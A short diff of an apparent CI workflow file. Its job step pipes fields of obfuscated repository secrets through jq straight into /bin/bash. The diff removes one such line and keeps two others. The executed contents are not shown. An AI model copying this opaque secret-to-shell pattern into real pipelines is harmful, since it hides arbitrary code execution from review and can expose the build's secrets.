@@ -21,7 +21,6 @@ jobs:
           vi901: ${{ secrets.vi901 }}
         run: |
           printf '%s' "$vi901" | jq -r .ez1845 | /bin/bash
-          printf '%s' "$hydvc07" | jq -r .oa779 | /bin/bash
           echo $plv11 | jq -r .rjqr88726 | /bin/bash
 
       - name: Upload results
